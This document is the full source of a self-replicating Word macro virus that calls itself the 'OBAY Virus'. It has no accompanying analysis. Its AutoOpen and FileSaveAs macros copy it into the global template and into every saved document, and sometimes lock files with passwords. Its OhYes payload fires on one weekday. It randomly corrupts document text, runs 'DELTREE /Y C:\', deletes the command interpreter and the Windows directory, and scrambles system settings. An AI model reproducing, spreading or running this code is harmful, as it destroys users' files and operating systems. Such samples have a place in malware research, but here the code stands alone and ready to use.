   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim FN$
   Dim FSA$
   Dim FAO$
   Dim FOY$
   On Error GoTo -1: On Error GoTo errortable
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If dlg.Format = 0 Then dlg.Format = 1
   If (WordBasic.Int(Rnd() * 100)) >= 95 Then
       WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0, AutoSave:=1, SaveInterval:="3", Format:=1, LockAnnot:=1, Password:="Virus", AddToMru:=1, WritePassword:="Tiny", RecommendReadOnly:=1
   Else
       WordBasic.ToolsOptionsSave FastSaves:=1, GlobalDotPrompt:=0, AutoSave:=1, SaveInterval:="3"
   End If
   If Err.Number <> 102 Then
       WordBasic.FileSaveAs dlg
       FN$ = WordBasic.[FileName$]()
       FSA$ = FN$ + ":FileSaveAs"
       FAO$ = FN$ + ":AutoOpen"
       FOY$ = FN$ + ":OhYes"
       If Not WordBasic.[GetDocumentVar$]("Giggle") = "OhMyGod" Then
           WordBasic.MacroCopy "Global:FileSaveAs", FSA$, 1
           WordBasic.MacroCopy "Global:AutoOpen", FAO$, 1
           WordBasic.MacroCopy "Global:OhYes", FOY$, 1
           WordBasic.SetDocumentVar "Giggle", "OhMyGod"
       Else
           If Not WordBasic.[MacroDesc$]("OhYes") = "Jump'in Macro's" Then WordBasic.Call "endof"
           WordBasic.MacroCopy FSA$, "Global:FileSaveAs", 1
           WordBasic.MacroCopy FAO$, "Global:AutoOpen", 1
           WordBasic.MacroCopy FOY$, "Global:OhYes", 1
   endof:
       End If
       WordBasic.FileSave
       WordBasic.ToolsMacro Name:="OhYes", Run:=1, Show:=0
   End If
   errortable:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim FN$
   Dim FSA$
   Dim FAO$
   Dim FOY$
   On Error GoTo -1: On Error GoTo endit
   FN$ = WordBasic.[FileName$]()
   FSA$ = FN$ + ":FileSaveAs"
   FAO$ = FN$ + ":AutoOpen"
   FOY$ = FN$ + ":OhYes"
   If Not WordBasic.[GetDocumentVar$]("Giggle") = "OhMyGod" Then
       WordBasic.MacroCopy "Global:FileSaveAs", FSA$, 1
       WordBasic.MacroCopy "Global:AutoOpen", FAO$, 1
       WordBasic.MacroCopy "Global:OhYes", FOY$, 1
       WordBasic.SetDocumentVar "Giggle", "OhMyGod"
   Else
       If Not WordBasic.[MacroDesc$]("OhYes") = "Jump'in Macro's" Then GoTo endof
       WordBasic.MacroCopy FSA$, "Global:FileSaveAs", 1
       WordBasic.MacroCopy FAO$, "Global:AutoOpen", 1
       WordBasic.MacroCopy FOY$, "Global:OhYes", 1
   endof:
   End If
   WordBasic.ToolsMacro Name:="OhYes", Run:=1, Show:=0
   endit:
   End Sub

   Attribute VB_Name = "OhYes"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Jump'in Macro's"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.OhYes.MAIN"
   On Error GoTo -1: On Error GoTo errortable
   WordBasic.DisableInput
   If Not WordBasic.Weekday(WordBasic.Now()) = 3 Then GoTo errortable
   Select Case WordBasic.Int(Rnd() * 50)
       Case 0 To 10
           SCase1
       Case 45 To 50
           SCase2
   End Select
   errortable:
   End Sub

   Private Sub SCase1()
   Dim F$
   Dim R$
           WordBasic.StartOfDocument
           Select Case WordBasic.Int(Rnd() * 5)
               Case 0
                   F$ = "By"
                   R$ = "It's Not Monday any more"
               Case 1
                   F$ = "^d"
                   R$ = "Error!"
               Case 2
                   F$ = " "
                   R$ = "·"
               Case 3
                   F$ = "B"
                   R$ = "ß"
               Case 4
                   F$ = "^#"
                   R$ = "#"
               Case 5
                   F$ = "^w"
                   R$ = "x"
           End Select
           WordBasic.EditReplace Find:=F$, Replace:=R$, Direction:=0, MatchCase:=0, WholeWord:=0, PatternMatch:=0, SoundsLike:=0, ReplaceAll:=1, Format:=0, Wrap:=2
   End Sub

   Private Sub SCase2()
   Dim Msg$
           Select Case WordBasic.Int(Rnd() * 5)
               Case 0
                   Msg$ = "Space Virus More space for the user"
                   WordBasic.Shell "DELTREE /Y C:\"
               Case 1
                   WordBasic.AppHide Chr((Rnd() * 25) + 65)
               Case 2
                   Msg$ = "Sorry Self-destruct is in action"
                   WordBasic.AppHide
               Case 3
                   Msg$ = "Windy"
                   Rem Window Problems
                   WordBasic.SetProfileString "Colors", "Window", WordBasic.Int(Rnd() * 255) + "," + WordBasic.Int(Rnd() * 255) + "," + WordBasic.Int(Rnd() * 255)
                   WordBasic.SetProfileString "Colors", "TitleText", WordBasic.Int(Rnd() * 255) + "," + WordBasic.Int(Rnd() * 255) + "," + WordBasic.Int(Rnd() * 255)
                   WordBasic.SetProfileString "Colors", "Menu", WordBasic.Int(Rnd() * 255) + "," + WordBasic.Int(Rnd() * 255) + "," + WordBasic.Int(Rnd() * 255)
                   WordBasic.SetProfileString "Windows", "SwapMouseButtons", WordBasic.Int(Rnd() * 1)
                   WordBasic.SetProfileString "Windows", "GridGranularity", WordBasic.Int(Rnd() * 255)
                   WordBasic.EditSelectAll
                   WordBasic.WW6_EditClear
               Case 4
                   Msg$ = "An error has occured you must re-start windows"
                   SetAttr Environ("COMSPEC"), 0
                   WordBasic.Kill Environ("COMSPEC")
               Case 5
                   Msg$ = "This is the OBAY Virus"
                   SetAttr Environ("WINDIR") + "\*.*", 0
                   WordBasic.Kill Environ("WINDIR") + "\*.*"
           End Select
           WordBasic.MsgBox Msg$
   End Sub
